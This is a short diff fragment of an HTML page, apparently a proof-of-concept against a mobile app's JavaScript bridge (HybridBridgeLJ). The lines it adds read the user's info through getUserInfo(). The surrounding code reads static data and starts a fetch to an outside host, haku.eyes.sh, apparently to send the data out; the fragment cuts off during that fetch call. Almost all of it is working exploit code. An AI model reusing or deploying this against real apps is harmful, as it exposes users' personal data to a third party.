@@ -10,6 +10,8 @@
 </body>
 <script src="https://s1.ljcdn.com/m-base/release/v04.4/asset/bridge_d0b9f70cd88e0a5q.js"></script>
 <script>
+    var info =  window.HybridBridgeLJ.getUserInfo();
+    alert(info);
     var data = window.HybridBridgeLJ._getStaticData();
     alert(data);
     fetch("http://haku.eyes.sh?beike", {
